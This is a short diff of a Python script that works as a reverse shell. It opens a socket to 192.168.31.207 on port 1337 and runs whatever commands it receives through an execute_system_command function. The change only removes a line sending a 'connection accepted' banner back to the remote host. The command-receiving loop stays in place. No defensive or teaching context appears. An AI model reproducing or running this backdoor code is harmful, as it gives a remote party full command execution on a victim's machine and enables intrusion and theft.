@@ -10,8 +10,6 @@ def execute_system_command(command):
 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 c.connect(("192.168.31.207", 1337))
 
-c.send("\n[+] Connection establishment request accepted.\n".encode('utf-8'))
-
 while True:
     cmd = c.recv(1024).decode('utf-8')
     cmd_result = execute_system_command(cmd)
